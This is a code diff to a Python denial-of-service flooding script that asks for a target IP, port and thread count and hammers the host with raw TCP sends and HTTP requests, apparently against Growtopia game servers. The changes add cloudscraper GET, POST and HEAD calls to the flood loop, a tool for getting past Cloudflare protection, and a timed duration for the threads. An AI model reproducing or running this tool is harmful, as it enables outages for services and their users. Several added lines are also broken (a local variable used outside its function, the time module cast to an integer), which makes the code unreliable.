@@ -2382,7 +2382,7 @@ print("------------------------------------------------")
 ip = str(input(" IP/DOMAIN: "))
 port = int(input(" PORT: "))
 method = str("TCP")
-times = int("500")
+times = int("200")
 threads = int(input(" THREADS: "))
 time.sleep(1)
 print("[0] Checking IP ..........")
@@ -2437,6 +2437,8 @@ def Headers(method):
 
 def ddos():
     socksCrawler()
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(time))
+    scraper = cloudscraper.create_scraper()
     get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
     post_host = "POST HTTP/1.1\r\nHost: " + ip + "\r\n"
     post_again = "POST http://" + ip + "/growtopia/server_data.php"
@@ -2472,6 +2474,9 @@ def ddos():
             s.send(data)
             s.send(data)
             s.send(data)
+            scraper.get(ip, timeout=5)
+            scraper.post("https://" + ip + "/growtopia/server_data.php", timeout=5)
+            scraper.head(ip, timeout=5)
             s.sendall(str.encode(request))
             s.sendall(str.encode(request))
             s.sendall(str.encode(request))
@@ -2558,5 +2563,5 @@ def ddos():
 
 
 for y in range(threads):
-    th = threading.Thread(target = ddos)
+    th = threading.Thread(target = ddos, args = until)
     th.start()
